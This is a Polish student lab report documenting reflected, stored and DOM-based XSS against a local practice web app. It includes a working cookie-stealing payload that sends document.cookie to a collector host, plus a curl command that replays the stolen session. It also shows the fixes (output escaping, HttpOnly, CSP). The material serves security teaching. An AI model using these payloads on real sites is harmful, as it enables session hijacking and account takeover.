# Dowody — Laboratorium 6 (XSS)

Aplikacja: `http://127.0.0.1:8080`, zbieracz: `http://localhost:8081`.
Dane i hasła fikcyjne. Wartości tokenów skrócone do kilkunastu znaków.
Polecenia dla Windows (`curl.exe`). Po każdej zmianie kodu: `docker compose restart web`.

Sekcje odpowiadają punktom „W raporcie:" z treści zadań.

---

## Zadanie 1 — XSS odbity

**1. Adres z ładunkiem** (zmienia tło na czerwone i tytuł karty na `XSS-odbity`):
```
http://127.0.0.1:8080/szukaj?q=<script>document.body.style.background='red';document.title='XSS-odbity'</script>
```

**2. Numer wiersza z błędem:** `aplikacja/app.py` — wiersz **37**.

**3. Fragment HTML odpowiedzi PRZED poprawką** (polecenie: `curl.exe "http://127.0.0.1:8080/szukaj?q=..."`):
```
<h1>Wyniki wyszukiwania dla: <script>document.body.style.background='red';document.title='XSS-odbity'</script></h1>
```

**4. Fragment HTML odpowiedzi PO poprawce** (`escape(fraza)` w wierszu 37):
```
<h1>Wyniki wyszukiwania dla: &lt;script&gt;document.body.style.background=&#x27;red&#x27;;document.title=&#x27;XSS-odbity&#x27;&lt;/script&gt;</h1>
```
Kontrola: `http://127.0.0.1:8080/szukaj?q=konsultacje` nadal znajduje ogłoszenie.

**5. Wniosek:** kodowanie wyjścia jest lepsze od usuwania słowa `script`, bo neutralizuje
wszystkie warianty wstrzyknięcia (np. `<img onerror>`, `<svg>`, `<SCrIpT>`), a filtr słowa
łatwo obejść i psuje legalny tekst zawierający „script".

---

## Zadanie 2 — XSS zapisany i przejęcie sesji

**1. Treść ładunku** (dodana jako ogłoszenie zalogowany jako `student`):
```
<img src=x onerror="new Image().src='http://localhost:8081/?c='+encodeURIComponent(document.cookie)">
```

**2. Wpis zbieracza PRZED zmianą** (`docker compose logs zbieracz`), token skrócony:
```
ZEBRANO: /?c=session=eyJ1enl0a293bmlr...
```

**Wpis zbieracza PO zmianie** (HttpOnly=True, po ponownym logowaniu) — `document.cookie`
nie zawiera już sesji, więc zbieracz dostaje pusty parametr:
```
ZEBRANO: /?c=
```

**3. Wynik kroku 3** — użycie skradzionego tokenu bez hasła:
```
curl.exe -i -b "session=<TOKEN>" http://127.0.0.1:8080/notatka
```
Zwrócono prywatną notatkę konta **anna**:
`Prywatna notatka Anny: kod do szafki w pracowni 4721 (fikcyjny).`
→ przejęcie sesji bez znajomości hasła.

**4. Oba nagłówki `Set-Cookie`** (`curl.exe -i -d "login=anna&haslo=anna-lab6" http://127.0.0.1:8080/logowanie`), token skrócony:
```
PRZED:  Set-Cookie: session=eyJ1enl0a293bmlr...; Path=/
PO:     Set-Cookie: session=eyJ1enl0a293bmlr...; HttpOnly; Path=/
```

**5. Wniosek:** HttpOnly nie usuwa podatności XSS — wstrzyknięty skrypt nadal się wykonuje
i może działać w sesji ofiary; HttpOnly jedynie uniemożliwia odczyt ciasteczka sesji
przez `document.cookie`.

---

## Zadanie 3 — Naprawa i Content Security Policy

**1. Tabela trzech ładunków (przed i po naprawie):**

| Ładunek | Adres / treść | PRZED naprawą | PO naprawie |
| Odbity | `/szukaj?q=<script>...</script>` | skrypt wykonany (czerwone tło, `XSS-odbity`) | wyświetlony jako tekst |
| Zapisany | ogłoszenie `<img ... onerror=...>` | skrypt wykonany (wysyłka cookie) | wyświetlony jako tekst |
| DOM | `/podglad#<img src=x onerror=document.title='XSS-DOM'>` | skrypt wykonany (`XSS-DOM`) | wyświetlony jako tekst |

**2. Nagłówek CSP z odpowiedzi** (`curl.exe -i http://127.0.0.1:8080/`):
```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self'
```

**3. Wynik testu tekstu** — dodane ogłoszenie:
```
Zażółć gęślą jaźń: <b>pogrubienie</b> & "cudzysłów" 'apostrof'
```
Wyświetla się dosłownie — znaki `< > & " '` zakodowane, `<b>` nie pogrubia
(auto-escaping Jinja2 działa). Podgląd `/podglad#...` nadal pokazuje zwykły tekst.

**4. Wniosek:** CSP jest dodatkową warstwą, a nie zamiennikiem kodowania wyjścia —
blokuje wykonanie wstrzykniętego skryptu, lecz nie naprawia samej luki wstrzyknięcia;
przy błędnej lub brakującej konfiguracji CSP podatność dalej istnieje.
